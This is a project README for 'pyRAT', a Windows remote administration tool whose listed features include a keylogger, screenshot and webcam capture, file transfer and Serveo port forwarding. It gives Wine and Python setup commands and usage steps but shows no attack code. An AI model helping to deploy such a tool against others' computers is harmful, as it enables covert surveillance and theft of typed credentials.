# pyRAT v1.0
## Author: github.com/thelinuxchoice
## IG: instagram.com/linux_choice
### Don't copy this code without giving me the credits, nerd! Read the Lincense.

Windows Remote Administration Tool (RAT)

![pr](https://user-images.githubusercontent.com/34893261/52543932-bc5afc80-2d94-11e9-882d-6e20e2e38958.png)

### Features:
#### Port Forwarding using Serveo
#### Take ScreenShot
#### Take Webcam Shot
#### Keylogger
#### Upload/Download File

## Legal disclaimer:

Usage of pyRAT for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 

### Installing Dependencies

```
bash install.sh
```

### Installing Dependencies Manually

```
wget https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
wine msiexec /i python-2.7.15.msi /L*v log.txt
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
cd ~/.wine/drive_c/Python27/
wine python.exe Scripts/pip.exe install pyinstaller paramiko

#Configuring PHP (received file size)
sed -i -e 's+upload_max_filesize = 2M+upload_max_filesize = 100M+g' $(php -i | grep -i "loaded configuration file" | cut -d ">" -f2)

```

### Usage:
```
git clone https://github.com/thelinuxchoice/pyRAT
cd pyRAT
bash pyrat.sh
```

### Donate!
Support the authors:
### Paypal:
https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=CLKRT5QXXFJY4&source=url
### LiberaPay:
<noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
